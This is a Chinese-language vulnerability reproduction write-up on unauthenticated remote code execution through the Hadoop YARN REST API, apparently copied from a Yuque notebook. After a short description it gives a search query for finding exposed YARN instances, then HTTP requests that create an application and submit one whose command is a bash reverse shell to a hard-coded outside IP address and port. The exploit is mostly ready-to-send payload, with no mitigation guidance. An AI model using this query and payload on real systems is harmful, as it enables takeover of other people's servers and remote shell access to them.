# Hadoop存在未授权访问导致的RCE

# 一、漏洞描述
Hadoop的核心设计包括分布式文件系统（HDFS）和MapReduce编程模型。HDFS是一个高容错性的分布式文件系统，设计用于在低成本的硬件上运行，提供高吞吐量以访问大规模数据。而MapReduce则是一种处理大规模数据的计算模型，它将应用程序分解成许多小的任务，这些任务可以在分布式集群的任何节点上执行。Hadoop的这些特性使其成为一个适合处理海量数据的平台，广泛应用于大数据存储和处理领域。由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。

# 二、影响版本
Hadoop

# 三、资产测绘
```plain
app="APACHE-hadoop-YARN"
```

![1730007748480-f12e937d-352a-4a44-8f45-4eadcefc02cd.png](./img/XntizMfXiFnObJzU/1730007748480-f12e937d-352a-4a44-8f45-4eadcefc02cd-735372.png)

# 三、漏洞复现
```plain
POST /ws/v1/cluster/apps/new-application HTTP/1.1
Host: 
Content-Type: application/json
Content-Length: 
```

![1730007792679-ad65176c-9062-4cb1-bde3-db16dcc3f638.png](./img/XntizMfXiFnObJzU/1730007792679-ad65176c-9062-4cb1-bde3-db16dcc3f638-482756.png)

反弹shell

```plain
POST /ws/v1/cluster/apps HTTP/1.1
Host: 
Content-Type: application/json
Content-Length: 256

{
  "application-id": "application_1234567890123_0001",
  "application-name": "get-shell",
  "am-container-spec": {
    "commands": {
      "command": "/bin/bash -i >& /dev/tcp/81.71.17.84/9999 0>&1"
    }
  },
  "application-type": "YARN"
}
```

![1730007867558-d3e6bed6-3b8b-4c27-9b67-29b40cb1395e.png](./img/XntizMfXiFnObJzU/1730007867558-d3e6bed6-3b8b-4c27-9b67-29b40cb1395e-570056.png)

![1730007901286-aceda32c-bc50-40b7-9e28-fba103dfd98a.png](./img/XntizMfXiFnObJzU/1730007901286-aceda32c-bc50-40b7-9e28-fba103dfd98a-766970.png)



> 更新: 2024-11-27 10:04:43  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dushc0i493wttgo1>